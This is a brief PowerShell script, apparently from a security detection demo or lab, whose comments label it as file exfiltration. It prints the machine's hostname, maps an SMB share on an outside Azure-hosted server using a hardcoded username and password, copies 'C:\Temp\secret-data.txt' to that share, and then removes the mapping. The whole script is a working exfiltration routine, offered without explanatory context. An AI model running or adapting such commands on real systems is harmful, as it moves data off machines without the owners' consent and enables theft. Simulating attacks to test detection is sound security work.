# Print hostname
$env:computername
# Exfiltrate file
# Create new file share link
New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
# Copy temp file to remote share
copy 'C:\Temp\secret-data.txt' 'Z:\'
Remove-SmbMapping -LocalPath 'Z:' -Force
